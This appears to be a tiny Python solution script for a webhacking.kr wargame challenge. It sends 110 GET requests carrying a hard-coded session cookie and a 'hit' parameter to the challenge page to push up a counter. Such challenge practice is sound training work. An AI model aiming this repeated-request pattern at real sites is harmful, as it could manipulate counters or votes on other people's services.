import requests

url = 'http://webhacking.kr/challenge/codeing/code5.html'

cookies = {
	'PHPSESSID': 'b9b0a5efc918d31332f12927d3c46895'
}

payloads = {
	'hit': 'r4k4'
}

for i in range(110):
	res = requests.get(url, cookies=cookies, params=payloads)
	
print(res.text)
